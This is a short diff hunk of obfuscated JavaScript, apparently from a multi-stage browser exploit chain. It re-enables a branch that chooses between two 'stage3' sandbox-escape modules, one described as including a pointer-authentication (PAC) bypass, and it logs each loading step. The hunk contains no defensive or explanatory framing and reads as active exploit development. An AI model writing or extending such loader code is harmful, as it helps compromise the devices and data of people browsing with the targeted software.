@@ -398,14 +398,14 @@
                 }
 
                 // Check if wC3yaB flag is set AND PAC integrity check passed
-          /*      if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
+             if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
                     // Load stage3 variant A (with PAC bypass)
                     // Hash: "7f809f320823063b55f26ba0d29cf197e2e333a8"
                     window.log(`[STAGE3] Loading sandbox escape variant A...`);
                     platform = await (await globalThis.moduleManager.getModuleByURL(
                         "Stage3_VariantA"
                     )).lA();
-               } else { */
+               } else { 
                     // Load stage3 variant B (without PAC / different approach)
                     // Hash: "c03c6f666a04dd77cfe56cda4da77a131cbb8f1c"
                     window.log(`[STAGE3] Loading sandbox escape variant B...`);
